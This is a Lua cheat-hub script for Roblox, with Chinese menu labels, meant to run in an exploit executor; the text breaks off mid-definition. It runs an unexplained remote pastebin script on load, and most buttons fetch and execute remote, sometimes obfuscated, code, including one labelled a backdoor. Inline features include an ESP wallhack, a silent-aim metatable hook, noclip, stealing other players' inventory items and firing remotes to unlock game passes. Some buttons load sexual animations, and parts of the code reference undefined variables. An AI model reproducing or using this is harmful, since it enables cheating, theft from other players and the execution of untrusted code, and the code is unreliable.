--如果你看见这段话,那么证明此脚本被开源或公开
loadstring(game:HttpGet("https://pastebin.com/raw/9fFu43FF"))()

game:GetService("StarterGui"):SetCore("SendNotification",{ Title = "纯缝合勿喷"; Text ="纯缝合"; Duration = 4; })

local CoreGui = game:GetService("StarterGui")

CoreGui:SetCore("SendNotification", {
    Title = "BS脚本(增添)1.6",
    Text = "正在加载（反挂机已开启）",
    Duration = 5, 
})
print("反挂机开启")
		local vu = game:GetService("VirtualUser")
		game:GetService("Players").LocalPlayer.Idled:connect(function()
		   vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
		   wait(1)
		   vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
		end)
local OrionLib = loadstring(game:HttpGet('https://pastebin.com/raw/iXGNieAz'))()
local Window = OrionLib:MakeWindow({Name ="BS脚本(增添)1.6", HidePremium = false, SaveConfig = true,IntroText = "BS中心(增添)1.6开启", ConfigFolder = "BS中心(增添)1.6"})

local Tab = Window:MakeTab({
    Name = "我想对你们说的话",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddParagraph("❤️BS脚本(增添)❤️")
Tab:AddParagraph("阿尔宙斯注入器可能用不了")
Tab:AddParagraph("作者游戏名老大二世")
Tab:AddParagraph("作者QQ1545959422")
Tab:AddParagraph("副作者QQ1710433791")
Tab:AddParagraph("增添版作者QQ2319127160")
Tab:AddParagraph("非常感谢QQ3928145450生成脚本")
Tab:AddParagraph("原作者已停止更新")
Tab:AddParagraph("Q群813485162")
Tab:AddParagraph("现作者Q2770967217")

local Tab = Window:MakeTab({
	Name = "设置",
	Icon = "rbxassetid://7734068321",
	PremiumOnly = false
})

Tab:AddParagraph("用户名:"," "..game.Players.LocalPlayer.Name.."")
Tab:AddParagraph("注入器:"," "..identifyexecutor().."")
Tab:AddParagraph("服务器的ID"," "..game.GameId.."")

Tab:AddButton({
	Name = "开启玩家进出服务器提示",
	Callback = function()
      	loadstring(game:HttpGet("https://raw.githubusercontent.com/boyscp/scriscriptsc/main/bbn.lua"))()
  	end
})

Tab:AddTextbox({
	Name = "跳跃高度设置",
	Default = "",
	TextDisappear = true,
	Callback = function(Value)
		game.Players.LocalPlayer.Character.Humanoid.JumpPower = Value
	end
})

Tab:AddTextbox({
	Name = "移动速度设置",
	Default = "",
	TextDisappear = true,
	Callback = function(Value)		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value
	end
})

Tab:AddTextbox({
	Name = "重力设置",
	Default = "",
	TextDisappear = true,
	Callback = function(Value)
		game.Workspace.Gravity = Value
	end
})

Tab:AddTextbox({
	Name = "血量设置(只能自己看)",
	Default = "",
	TextDisappear = true,
	Callback = function(Value)
		game.Players.LocalPlayer.Character.Humanoid.Health = Value
	end
})

Tab:AddTextbox({
	Name = "超广角设置",
	Default = "",
	TextDisappear = true,
	Callback = function(Value)
		Workspace.CurrentCamera.FieldOfView = Value
	end
})

Tab:AddTextbox({
	Name = "最大视野设置",
	Default = "",
	TextDisappear = true,
	Callback = function(Value)
		Workspace.CurrentCamera.FieldOfView = Value
	end
})

Tab:AddTextbox({
	Name = "最小视野设置",
	Default = "",
	TextDisappear = true,
	Callback = function(Value)
		game.Workspace.CurrentCamera.FieldOfView = v
	end
})

Tab:AddTextbox({
	Name = "视野缩放",
	Default = "",
	TextDisappear = true,
	Callback = function(Value)			    wuhu123ghiusahiwu = Value
		game:GetService("Players").LocalPlayer.CameraMaxZoomDistance = Value
	end
})

Tab:AddButton({
  Name = "锁定缩放",
  Callback = function()
  	    while Value == true do
		    wait(1)
			if Value == true then
			    game:GetService("Players").LocalPlayer.CameraMaxZoomDistance = wuhu123ghiusahiwu
			end
		end
  end
})

Tab:AddButton({
  Name = "锁定生命",
  Callback = function()
  	    while Value == true do
		    wait(1)
		    if Value == true then
	    	    game.Players.LocalPlayer.Character.Humanoid.Health = wuhughiusahiwu
			end
		end
  end
})

Tab:AddButton({
  Name = "重新加入服务器",
  Callback = function()
game:GetService("TeleportService"):TeleportToPlaceInstance(
            game.PlaceId,
            game.JobId,
            game:GetService("Players").LocalPlayer
        )
  end
})

Tab:AddButton({
  Name = "离开服务器",
  Callback = function()
     game:Shutdown()
  end
})

Tab:AddButton({
  Name = "帧率显示",
  Callback = function()
 -- Gui to Lua 
 -- Version: 3.2 
  
 -- Instances:
 local ScreenGui = Instance.new("ScreenGui") 
 local FpsLabel = Instance.new("TextLabel")
 
 --Properties:
 
 ScreenGui.Name = "FPSGui" 
 ScreenGui.ResetOnSpawn = false 
 ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling 
 
 FpsLabel.Name = "FPSLabel" 
 FpsLabel.Size = UDim2.new(0, 100, 0, 50) 
 FpsLabel.Position = UDim2.new(0, 10, 0, 10) 
 FpsLabel.BackgroundTransparency = 1 
 FpsLabel.Font = Enum.Font.SourceSansBold 
 FpsLabel.Text = "帧率: 0" 
 FpsLabel.TextSize = 20 
 FpsLabel.TextColor3 = Color3.new(1, 1, 1) 
 FpsLabel.Parent = ScreenGui 
  
 function updateFpsLabel() 
     local fps = math.floor(1 / game:GetService("RunService").RenderStepped:Wait()) 
     FpsLabel.Text = "帧率: " .. fps 
 end 
  
  game:GetService("RunService").RenderStepped:Connect(updateFpsLabel) 
  
 ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")


 animateCredits()
  end
})

Tab:AddButton({
  Name = "显示时间",
  Callback = function()
local LBLG = Instance.new("ScreenGui", getParent)
local LBL = Instance.new("TextLabel", getParent)
local player = game.Players.LocalPlayer

LBLG.Name = "LBLG"
LBLG.Parent = game.CoreGui
LBLG.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
LBLG.Enabled = true
LBL.Name = "LBL"
LBL.Parent = LBLG
LBL.BackgroundColor3 = Color3.new(1, 1, 1)
LBL.BackgroundTransparency = 1
LBL.BorderColor3 = Color3.new(0, 0, 0)
LBL.Position = UDim2.new(0.75,0,0.010,0)
LBL.Size = UDim2.new(0, 133, 0, 30)
LBL.Font = Enum.Font.GothamSemibold
LBL.Text = "TextLabel"
LBL.TextColor3 = Color3.new(1, 1, 1)
LBL.TextScaled = true
LBL.TextSize = 14
LBL.TextWrapped = true
LBL.Visible = true

local FpsLabel = LBL
local Heartbeat = game:GetService("RunService").Heartbeat
local LastIteration, Start
local FrameUpdateTable = { }

local function HeartbeatUpdate()
	LastIteration = tick()
	for Index = #FrameUpdateTable, 1, -1 do
		FrameUpdateTable[Index + 1] = (FrameUpdateTable[Index] >= LastIteration - 1) and FrameUpdateTable[Index] or nil
	end
	FrameUpdateTable[1] = LastIteration
	local CurrentFPS = (tick() - Start >= 1 and #FrameUpdateTable) or (#FrameUpdateTable / (tick() - Start))
	CurrentFPS = CurrentFPS - CurrentFPS % 1
	FpsLabel.Text = ("BS时间:"..os.date("%H").."时"..os.date("%M").."分"..os.date("%S")).."秒"
end
Start = tick()
Heartbeat:Connect(HeartbeatUpdate)
  end
})


Tab:AddButton({
  Name = "重开",
  Callback = function()

game.Players.LocalPlayer.Character.Head:Remove()

  end
})

local Tab = Window:MakeTab({
	Name = "通用",
	Icon = "rbxassetid://7734068321",
	PremiumOnly = false
})

Tab:AddToggle({
	Name = "夜视",
	Default = false,
	Callback = function(Value)

		if Value then
		    game.Lighting.Ambient = Color3.new(1, 1, 1)
		else
		    game.Lighting.Ambient = Color3.new(0, 0, 0)
		end
	end
})

Tab:AddToggle({
  Name = "秒杀有血量的NPC",
  Default = false,
  Callback = function(Value)
  if Value then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/WSbuq/-/main/killNPC"))()
    else
    loadstring(game:HttpGet("https://raw.githubusercontent.com/WSbuq/-/main/killNPC1"))()
  end
end
})

Tab:AddButton({
  Name = "查看游戏中的所有玩家（包括血量条）",
  Callback = function()
      assert(Drawing, "missing dependency: 'Drawing'") local Players = game:GetService("Players") local RunService = game:GetService("RunService") local localPlayer = Players.LocalPlayer local camera = workspace.CurrentCamera local cache = {} local BOX_OUTLINE_COLOR = Color3.new(0, 0, 0) local BOX_COLOR = Color3.new(1, 0, 0) local NAME_COLOR = Color3.new(1, 1, 1) local HEALTH_OUTLINE_COLOR = Color3.new(0, 0, 0) local HEALTH_HIGH_COLOR = Color3.new(0, 1, 0) local HEALTH_LOW_COLOR = Color3.new(1, 0, 0) local CHAR_SIZE = Vector2.new(4, 6) local function create(class, properties) local drawing = Drawing.new(class) for property, value in pairs(properties) do drawing[property] = value end return drawing end local function floor2(v) return Vector2.new(math.floor(v.X), math.floor(v.Y)) end local function createEsp(player) local esp = {} esp.boxOutline = create("Square", {Color = BOX_OUTLINE_COLOR, Thickness = 3, Filled = false}) esp.box = create("Square", {Color = BOX_COLOR, Thickness = 1, Filled = false}) esp.name = create("Text", {Color = NAME_COLOR, Font = (syn and not RectDynamic) and 2 or 1, Outline = true, Center = true, Size = 13}) esp.healthOutline = create("Line", {Thickness = 3, Color = HEALTH_OUTLINE_COLOR}) esp.health = create("Line", {Thickness = 1}) cache[player] = esp end local function removeEsp(player) local esp = cache[player] if not esp then return end for _, drawing in pairs(esp) do drawing:Remove() end cache[player] = nil end local function updateEsp() for player, esp in pairs(cache) do local character, team = player.Character, player.Team if character and (not team or team ~= localPlayer.Team) then local cframe = character:GetPivot() local screen, onScreen = camera:WorldToViewportPoint(cframe.Position) if onScreen then local frustumHeight = math.tan(math.rad(camera.FieldOfView * 0.5)) * 2 * screen.Z local size = camera.ViewportSize.Y / frustumHeight * CHAR_SIZE local position = Vector2.new(screen.X, screen.Y) esp.boxOutline.Size = floor2(size) esp.boxOutline.Position = floor2(position - size * 0.5) esp.box.Size = esp.boxOutline.Size esp.box.Position = esp.boxOutline.Position esp.name.Text = string.lower(player.Name) esp.name.Position = floor2(position - Vector2.yAxis * (size.Y * 0.5 + esp.name.TextBounds.Y + 2)) local humanoid = character:FindFirstChildOfClass("Humanoid") local health = (humanoid and humanoid.Health or 100) / 100 esp.healthOutline.From = floor2(position - size * 0.5) - Vector2.xAxis * 5 esp.healthOutline.To = floor2(position - size * Vector2.new(0.5, -0.5)) - Vector2.xAxis * 5 esp.health.From = esp.healthOutline.To esp.health.To = floor2(esp.healthOutline.To:Lerp(esp.healthOutline.From, health)) esp.health.Color = HEALTH_LOW_COLOR:Lerp(HEALTH_HIGH_COLOR, health) esp.healthOutline.From = Vector2.yAxis esp.healthOutline.To = Vector2.yAxis end for _, drawing in pairs(esp) do drawing.Visible = onScreen end else for _, drawing in pairs(esp) do drawing.Visible = false end end end end Players.PlayerAdded:Connect(createEsp) Players.PlayerRemoving:Connect(removeEsp) RunService.RenderStepped:Connect(updateEsp) for idx, player in ipairs(Players:GetPlayers()) do if idx ~= 1 then createEsp(player) end end
  end
})

Tab:AddButton({
  Name = "偷别人物品栏道具",
  Callback = function()
  --Copy And Paste:
for i,v in pairs (game.Players:GetChildren()) do
wait()
for i,b in pairs (v.Backpack:GetChildren()) do
b.Parent = game.Players.LocalPlayer.Backpack
end
end
  end
})

Tab:AddButton({
  Name = "位置仪",
  Callback = function()
  local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local title = Instance.new("TextLabel")
local copy = Instance.new("TextButton")
local pos = Instance.new("TextBox")
local find = Instance.new("TextButton")
 
--Properties:
 
ScreenGui.Parent = game.CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.639646292, 0, 0.399008662, 0)
Frame.Size = UDim2.new(0, 387, 0, 206)
Frame.Active = true
 
title.Name = "title"
title.Parent = Frame
title.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
title.BorderSizePixel = 0
title.Size = UDim2.new(0, 387, 0, 50)
title.Font = Enum.Font.GothamBold
title.Text = "位置仪"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextSize = 30.000
title.TextWrapped = true
 
copy.Name = "copy"
copy.Parent = Frame
copy.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
copy.BorderSizePixel = 0
copy.Position = UDim2.new(0.527131796, 0, 0.635922313, 0)
copy.Size = UDim2.new(0, 148, 0, 50)
copy.Font = Enum.Font.GothamSemibold
copy.Text = "复制"
copy.TextColor3 = Color3.fromRGB(255, 255, 255)
copy.TextSize = 20.000
 
pos.Name = "pos"
pos.Parent = Frame
pos.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
pos.BorderSizePixel = 0
pos.Position = UDim2.new(0.0904392749, 0, 0.305825233, 0)
pos.Size = UDim2.new(0, 317, 0, 50)
pos.Font = Enum.Font.GothamSemibold
pos.Text = ""
pos.TextColor3 = Color3.fromRGB(255, 255, 255)
pos.TextSize = 14.000
pos.TextWrapped = true
 
find.Name = "find"
find.Parent = Frame
find.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
find.BorderSizePixel = 0
find.Position = UDim2.new(0.0904392898, 0, 0.635922313, 0)
find.Size = UDim2.new(0, 148, 0, 50)
find.Font = Enum.Font.GothamSemibold
find.Text = "查找当前位置"
find.TextColor3 = Color3.fromRGB(255, 255, 255)
find.TextSize = 20.000
 
-- Scripts:
 
local function UMTQ_fake_script() -- copy.LocalScript 
	local script = Instance.new('LocalScript', copy)
 
	script.Parent.MouseButton1Click:Connect(function()
		setclipboard(script.Parent.Parent.pos.Text)
	end)
end
coroutine.wrap(UMTQ_fake_script)()
local function KJAYG_fake_script() -- Frame.Dragify 
	local script = Instance.new('LocalScript', Frame)
 
	local UIS = game:GetService("UserInputService")
	function dragify(Frame)
	    dragToggle = nil
	    local dragSpeed = 0
	    dragInput = nil
	    dragStart = nil
	    local dragPos = nil
	    function updateInput(input)
	        local Delta = input.Position - dragStart
	        local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
	        game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.25), {Position = Position}):Play()
	    end
	    Frame.InputBegan:Connect(function(input)
	        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
	            dragToggle = true
	            dragStart = input.Position
	            startPos = Frame.Position
	            input.Changed:Connect(function()
	                if input.UserInputState == Enum.UserInputState.End then
	                    dragToggle = false
	                end
	            end)
	        end
	    end)
	    Frame.InputChanged:Connect(function(input)
	        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
	            dragInput = input
	        end
	    end)
	    game:GetService("UserInputService").InputChanged:Connect(function(input)
	        if input == dragInput and dragToggle then
	            updateInput(input)
	        end
	    end)
	end
 
	dragify(script.Parent)
end
coroutine.wrap(KJAYG_fake_script)()
local function EKBNYI_fake_script() -- find.LocalScript 
	local script = Instance.new('LocalScript', find)
 
	script.Parent.MouseButton1Down:Connect(function()
		script.Parent.Parent.pos.Text = tostring(game.Players.LocalPlayer.Character.HumanoidRootPart.Position)
	end)
end
coroutine.wrap(EKBNYI_fake_script)()
  end
})

Tab:AddButton({
  Name = "穿墙(可开关)",
  Callback = function()
  local Workspace = game:GetService("Workspace")
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local Noclip = Instance.new("ScreenGui")
local BG = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local Toggle = Instance.new("TextButton")
local StatusPF = Instance.new("TextLabel")
local Status = Instance.new("TextLabel")
local Credit = Instance.new("TextLabel")
local Plr = Players.LocalPlayer
local Clipon = false

Noclip.Name = "Noclip"
Noclip.Parent = game.CoreGui

BG.Name = "BG"
BG.Parent = Noclip
BG.BackgroundColor3 = Color3.new(0.0980392, 0.0980392, 0.0980392)
BG.BorderColor3 = Color3.new(0.0588235, 0.0588235, 0.0588235)
BG.BorderSizePixel = 2
BG.Position = UDim2.new(0.149479166, 0, 0.82087779, 0)
BG.Size = UDim2.new(0, 210, 0, 127)
BG.Active = true
BG.Draggable = true

Title.Name = "Title"
Title.Parent = BG
Title.BackgroundColor3 = Color3.new(0.266667, 0.00392157, 0.627451)
Title.BorderColor3 = Color3.new(0.180392, 0, 0.431373)
Title.BorderSizePixel = 2
Title.Size = UDim2.new(0, 210, 0, 33)
Title.Font = Enum.Font.Highway
Title.Text = "Noclip"
Title.TextColor3 = Color3.new(1, 1, 1)
Title.FontSize = Enum.FontSize.Size32
Title.TextSize = 30
Title.TextStrokeColor3 = Color3.new(0.180392, 0, 0.431373)
Title.TextStrokeTransparency = 0

Toggle.Parent = BG
Toggle.BackgroundColor3 = Color3.new(0.266667, 0.00392157, 0.627451)
Toggle.BorderColor3 = Color3.new(0.180392, 0, 0.431373)
Toggle.BorderSizePixel = 2
Toggle.Position = UDim2.new(0.152380958, 0, 0.374192119, 0)
Toggle.Size = UDim2.new(0, 146, 0, 36)
Toggle.Font = Enum.Font.Highway
Toggle.FontSize = Enum.FontSize.Size28
Toggle.Text = "Toggle"
Toggle.TextColor3 = Color3.new(1, 1, 1)
Toggle.TextSize = 25
Toggle.TextStrokeColor3 = Color3.new(0.180392, 0, 0.431373)
Toggle.TextStrokeTransparency = 0

StatusPF.Name = "StatusPF"
StatusPF.Parent = BG
StatusPF.BackgroundColor3 = Color3.new(1, 1, 1)
StatusPF.BackgroundTransparency = 1
StatusPF.Position = UDim2.new(0.314285725, 0, 0.708661377, 0)
StatusPF.Size = UDim2.new(0, 56, 0, 20)
StatusPF.Font = Enum.Font.Highway
StatusPF.FontSize = Enum.FontSize.Size24
StatusPF.Text = "Status:"
StatusPF.TextColor3 = Color3.new(1, 1, 1)
StatusPF.TextSize = 20
StatusPF.TextStrokeColor3 = Color3.new(0.333333, 0.333333, 0.333333)
StatusPF.TextStrokeTransparency = 0
StatusPF.TextWrapped = true

Status.Name = "Status"
Status.Parent = BG
Status.BackgroundColor3 = Color3.new(1, 1, 1)
Status.BackgroundTransparency = 1
Status.Position = UDim2.new(0.580952346, 0, 0.708661377, 0)
Status.Size = UDim2.new(0, 56, 0, 20)
Status.Font = Enum.Font.Highway
Status.FontSize = Enum.FontSize.Size14
Status.Text = "off"
Status.TextColor3 = Color3.new(0.666667, 0, 0)
Status.TextScaled = true
Status.TextSize = 14
Status.TextStrokeColor3 = Color3.new(0.180392, 0, 0.431373)
Status.TextWrapped = true
Status.TextXAlignment = Enum.TextXAlignment.Left

Credit.Name = "Credit"
Credit.Parent = BG
Credit.BackgroundColor3 = Color3.new(1, 1, 1)
Credit.BackgroundTransparency = 1
Credit.Position = UDim2.new(0.195238099, 0, 0.866141737, 0)
Credit.Size = UDim2.new(0, 128, 0, 17)
Credit.Font = Enum.Font.SourceSans
Credit.FontSize = Enum.FontSize.Size18
Credit.Text = "Created by KingLuna"
Credit.TextColor3 = Color3.new(1, 1, 1)
Credit.TextSize = 16
Credit.TextStrokeColor3 = Color3.new(0.196078, 0.196078, 0.196078)
Credit.TextStrokeTransparency = 0
Credit.TextWrapped = true

Toggle.MouseButton1Click:connect(function()
	if Status.Text == "off" then
		Clipon = true
		Status.Text = "on"
		Status.TextColor3 = Color3.new(0,185,0)
		Stepped = game:GetService("RunService").Stepped:Connect(function()
			if not Clipon == false then
				for a, b in pairs(Workspace:GetChildren()) do
                if b.Name == Plr.Name then
                for i, v in pairs(Workspace[Plr.Name]:GetChildren()) do
                if v:IsA("BasePart") then
                v.CanCollide = false
                end end end end
			else
				Stepped:Disconnect()
			end
		end)
	elseif Status.Text == "on" then
		Clipon = false
		Status.Text = "off"
		Status.TextColor3 = Color3.new(170,0,0)
	end
end)
  end
})

Tab:AddButton({  
    Name = "游戏通行证(跑酷游戏)",
	Callback = function()
	for _,v in pairs(game:GetDescendants()) do
if v.ClassName == "RemoteEvent" then
if v.Parent.Name == "WeaponsRemotes" or v.Parent.Name == "VipRemotes" or v.Parent.Name == "Remotes" then
v:FireServer()
end
end
end
     end
})

Tab:AddButton({
  Name = "死亡笔记",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/dingding123hhh/tt/main/%E6%AD%BB%E4%BA%A1%E7%AC%94%E8%AE%B0%20(1).txt"))()
  end
})

Tab:AddButton({
  Name = "删除购买提示",
  Callback = function()
    _G.Value = DBY if _G.value then game:GetService("CoreGui").PurchasePromptApp.Enabled = false else _G.Value = value game:GetService("CoreGui").PurchasePromptApp.Enabled = true end
  end
})

Tab:AddButton({
  Name = "解锁游戏通行证（测试）",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/LX318/LX/main/%E8%A7%A3%E9%94%81%E6%B8%B8%E6%88%8F%E9%80%9A%E8%A1%8C%E8%AF%81%202.lua"))()
  end
})

Tab:AddButton({
  Name = "自动互动",
  Callback = function()
          if state then
            autoInteract = true
            while autoInteract do
                for _, descendant in pairs(workspace:GetDescendants()) do
                    if descendant:IsA("ProximityPrompt") then
                        fireproximityprompt(descendant)
                    end
                end
                task.wait(0.25) -- Adjust the wait time as needed
            end
        else
            autoInteract = false
        end
  end
})

Tab:AddButton({
  Name = "fps显示",
  Callback = function()
  loadstring(game:HttpGet("https://pastefy.app/d9j82YJr/raw",false))()
  end
})

Tab:AddButton({
  Name = "老外撸管脚本r15",
  Callback = function()
  loadstring(game:HttpGet("https://pastefy.app/YZoglOyJ/raw"))()
  end
})

Tab:AddButton({
  Name = "老外撸管脚本r6",
  Callback = function()
  loadstring(game:HttpGet("https://pastefy.app/wa3v2Vgm/raw"))()
  end
})

Tab:AddButton({
  Name = "黄色动作",
  Callback = function()
  loadstring(game:HttpGet(('https://pastebin.com/raw/ZfaM6tNg'),true))()
  end
})

Tab:AddButton({
  Name = "操人脚本V1",
  Callback = function()
  loadstring(game:HttpGet("https://pastebin.com/raw/bzmhRgKL"))()
  end
})

Tab:AddButton({
  Name = "不雅动作",
  Callback = function()
  loadstring(game:HttpGet("https://gist.githubusercontent.com/doxplov/85ddd1d1eabad866edbcbf8ed922804f/raw/38441626de5df4d3d891cc49613f3e17a54ea4a0/sushihub.lua", true))()
  end
})
Tab:AddButton({
  Name = "穿墙(可关闭)",
  Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/TtmScripter/OtherScript/main/Noclip"))()
  end
})

Tab:AddButton({
  Name = "阿尔宙斯注入器3.0",
  Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/chillz-workshop/main/Arceus%20X%20V3"))()
  end
})

Tab:AddButton({
  Name = "子弹追踪(视角会变得奇怪)",
  Callback = function()
local Camera = game:GetService("Workspace").CurrentCamera
local Players = game:GetService("Players")
local LocalPlayer = game:GetService("Players").LocalPlayer

local function GetClosestPlayer()
   local ClosestPlayer = nil
   local FarthestDistance = math.huge

   for i, v in pairs(Players.GetPlayers(Players)) do
       if v ~= LocalPlayer and v.Character and v.Character.FindFirstChild(v.Character, "HumanoidRootPart") then
           local DistanceFromPlayer = (LocalPlayer.Character.HumanoidRootPart.Position - v.Character.HumanoidRootPart.Position).Magnitude

           if DistanceFromPlayer < FarthestDistance then
               FarthestDistance = DistanceFromPlayer
               ClosestPlayer = v
           end
       end
   end

   if ClosestPlayer then
       return ClosestPlayer
   end
end

local GameMetaTable = getrawmetatable(game)
local OldGameMetaTableNamecall = GameMetaTable.__namecall
setreadonly(GameMetaTable, false)

GameMetaTable.__namecall = newcclosure(function(object, ...)
   local NamecallMethod = getnamecallmethod()
   local Arguments = {...}

   if tostring(NamecallMethod) == "FindPartOnRayWithIgnoreList" then
       local ClosestPlayer = GetClosestPlayer()
       
       if ClosestPlayer and ClosestPlayer.Character then
           Arguments[1] = Ray.new(Camera.CFrame.Position, (ClosestPlayer.Character.Head.Position - Camera.CFrame.Position).Unit * (Camera.CFrame.Position - ClosestPlayer.Character.Head.Position).Magnitude)
       end
   end

   return OldGameMetaTableNamecall(object, unpack(Arguments))
end)

setreadonly(GameMetaTable, true)
  end
})

Tab:AddButton({
  Name = "吸人(一局只能吸一次)",
  Callback = function()
loadstring(game:HttpGet('https://pastebin.com/raw/PVPFXqtH'))()
  end
})

Tab:AddButton({
  Name = "获取管理员",
  Callback = function()
  loadstring(game:HttpGet("https://pastebin.com/raw/sZpgTVas"))()
  end
})

Tab:AddButton({
  Name = "后门脚本",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v6x/source.lua"))()
  end
})

Tab:AddButton({
  Name = "飞行V3",
  Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/pMyEyJN6"))()
  end
})

Tab:AddButton({
  Name = "隐身",
  Callback = function()

loadstring(game:HttpGet('https://pastebin.com/raw/3Rnd9rHf'))()

  end
})

Tab:AddButton({
  Name = "安全区",
  Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/rmPfWVU3"))()
  end
})

Tab:AddButton({
	Name = "快速旋转",
	Callback = function()
     --BROUGHT TO YOU BY RSCRIPTS.NET--

if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
spawn(function()
local speaker = game.Players.LocalPlayer
local Anim = Instance.new("Animation")
     Anim.AnimationId = "rbxassetid://27432686"
     local bruh = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
bruh:Play()
bruh:AdjustSpeed(0)
speaker.Character.Animate.Disabled = true
local hi = Instance.new("Sound")
hi.Name = "Sound"
hi.SoundId = "http://www.roblox.com/asset/?id=8114290584"
hi.Volume = 2
hi.Looped = false
hi.archivable = false
hi.Parent = game.Workspace
hi:Play()
wait(1.5)
local spinSpeed = 30
local Spin = Instance.new("BodyAngularVelocity")
Spin.Name = "Spinning"
Spin.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
Spin.MaxTorque = Vector3.new(0, math.huge, 0)
Spin.AngularVelocity = Vector3.new(0,spinSpeed,0)
wait(3.5)
while speaker.Character.Humanoid.Health > 0 do
   wait(0)
speaker.Character.Humanoid.HipHeight = speaker.Character.Humanoid.HipHeight + 0
end
end)
else
spawn(function()
local speaker = game.Players.LocalPlayer
local Anim = Instance.new("Animation")
     Anim.AnimationId = "rbxassetid://507776043"
     local bruh = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
bruh:Play()
bruh:AdjustSpeed(0)
speaker.Character.Animate.Disabled = true
local hi = Instance.new("Sound")
hi.Name = "Sound"
hi.SoundId = "http://www.roblox.com/asset/?id=8114290584"
hi.Volume = 0
hi.Looped = false
hi.archivable = false
hi.Parent = game.Workspace
hi:Play()
wait()
local spinSpeed = 30
local Spin = Instance.new("BodyAngularVelocity")
Spin.Name = "Spinning"
Spin.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
Spin.MaxTorque = Vector3.new(0, math.huge, 0)
Spin.AngularVelocity = Vector3.new(0,spinSpeed,0)
wait(3.5)
while speaker.Character.Humanoid.Health > 0 do
   wait(0)
speaker.Character.Humanoid.HipHeight = speaker.Character.Humanoid.HipHeight + 0
end
end)    
end
  	end    
})

Tab:AddButton({
  Name = "极速旋转",
  Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/ckiGL34v"))()
  end
})

Tab:AddButton({
  Name = "在聊天框中进行图画",
  Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/ocfi/Draw-To-Chat-Obfuscated/refs/heads/main/Draw%20to%20Chat"))()
  end
})

Tab:AddButton({
  Name = "锁定视角",
  Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/gdLR5Z7X"))()
  end
})

Tab:AddButton({
	Name = "点击传送工器",
	Callback = function()

mouse = game.Players.LocalPlayer:GetMouse() tool = Instance.new("Tool") tool.RequiresHandle = false tool.Name = "[bs中心]传送工具" tool.Activated:connect(function() local pos = mouse.Hit+Vector3.new(0,2.5,0) pos = CFrame.new(pos.X,pos.Y,pos.Z) game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos end) tool.Parent = game.Players.LocalPlayer.Backpack

	end
})

Tab:AddButton({
  Name = "吸人脚本2(可循环开启)",
  Callback = function()

loadstring(game:HttpGet("https://pastebin.com/raw/sbxKPPHc"))()
  end
})

Tab:AddButton({
	Name = "走路创人",
	Callback = function()
     loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/obf_5wpM7bBcOPspmX7lQ3m75SrYNWqxZ858ai3tJdEAId6jSI05IOUB224FQ0VSAswH.lua.txt'),true))()
  	end    
})

Tab:AddButton({
	Name = "铁拳打人",
	Callback = function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/obf_rf6iQURzu1fqrytcnLBAvW34C9N55kS9g9G3CKz086rC47M6632sEd4ZZYB0AYgV.lua.txt'),true))()
end
})

Tab:AddButton({
  Name = "透视",
  Callback = function()
              loadstring(game:HttpGet('https://raw.githubusercontent.com/Lucasfin000/SpaceHub/main/UESP'))()
end
})

Tab:AddButton({
	Name = "点击传送工具",
	Callback = function()
mouse = game.Players.LocalPlayer:GetMouse() tool = Instance.new("Tool") tool.RequiresHandle = false tool.Name = "[FE] TELEPORT TOOL" tool.Activated:connect(function() local pos = mouse.Hit+Vector3.new(0,2.5,0) pos = CFrame.new(pos.X,pos.Y,pos.Z) game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos end) tool.Parent = game.Players.LocalPlayer.Backpack
	end
})

Tab:AddButton({
  Name = "甩人",
  Callback = function()
  loadstring(game:HttpGet("https://pastebin.com/raw/L9QBifcX"))()
  end
})

Tab:AddButton({
	Name = "无限跳",
	Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/V5PQy3y0", true))()
end
})

Tab:AddButton({
  Name = "灵魂出窍",
  Callback = function()
